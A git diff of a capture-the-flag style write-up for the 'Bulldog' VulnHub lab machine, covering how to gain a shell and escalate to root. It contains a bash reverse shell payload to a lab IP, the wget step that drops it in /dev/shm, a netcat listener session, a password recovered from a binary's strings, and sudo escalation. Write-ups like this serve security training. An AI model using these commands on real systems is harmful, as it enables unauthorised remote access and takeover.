@@ -102,7 +102,7 @@ I just made a file with a reverse shell payload in it and called it `shell.sh`:
 bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
 ```
 
-then served a python http server and used wget to download and put the file in `/dev/shm` directory of the victim :
+then served a python http server and used `wget` to download and put the file in `/dev/shm` directory of the victim :
 
 ![wget](https://github.com/Git-K3rnel/VulnHub/assets/127470407/112e8ae4-5a2e-4a00-b748-d05714c81a02)
 
@@ -110,9 +110,94 @@ then start a listener on your machine and just execute it with another bash comm
 
 ![bash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4ce5f34f-db6a-491d-9c66-a4149345860f)
 
+```bash
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 41242
+bash: cannot set terminal process group (963): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+bash: /root/.bashrc: Permission denied
+django@bulldog:/home/django/bulldog$ id
+
+uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
+
+django@bulldog:/home/django/bulldog$
+```
+
+## 4.Privilege Escalation
+
+We navigate to `/home/bulldogadmin` and see the content :
+
+```bash
+django@bulldog:/home/bulldogadmin$ ls -la
+ls -la
+total 40
+drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 21  2017 .
+drwxr-xr-x 4 root         root         4096 Aug 24  2017 ..
+-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout
+-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24  2017 .bashrc
+drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24  2017 .cache
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 21  2017 .hiddenadmindirectory
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 25  2017 .nano
+-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile
+-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor
+-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful
+-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts
+```
+
+there is a hidden directory here called `.hiddenadmindirectory` and the content is :
+
+```bash
+customPermissionApp
+note
+```
+
+read the note and try to execute the `customPermissionApp` but it is not possible, so let's check the strings of it :
 
 
+![password](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8e8d5869-eac3-49f0-b114-0e3fd5b5b552)
 
+put these lined together and remove the `H` from it and you will get :
 
+```text
+SUPERultimatePASSWORDyouCANTget
+```
 
+this password is used for user `django` (our current user), let's check out sudo permissions :
 
+```bash
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo -l
+sudo -l
+[sudo] password for django: SUPERultimatePASSWORDyouCANTget
+
+Matching Defaults entries for django on bulldog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User django may run the following commands on bulldog:
+    (ALL : ALL) ALL
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$
+```
+
+easily we can be root on the machine :
+
+```bash
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo /bin/bash
+
+root@bulldog:/home/bulldogadmin/.hiddenadmindirectory# cd /root
+
+root@bulldog:~# cat congrats.txt
+cat congrats.txt
+Congratulations on completing this VM :D That wasn't so bad was it?
+
+Let me know what you thought on twitter, I'm @frichette_n
+
+As far as I know there are two ways to get root. Can you find the other one?
+
+Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
+```
+
+this is how you can become root on this machine :)
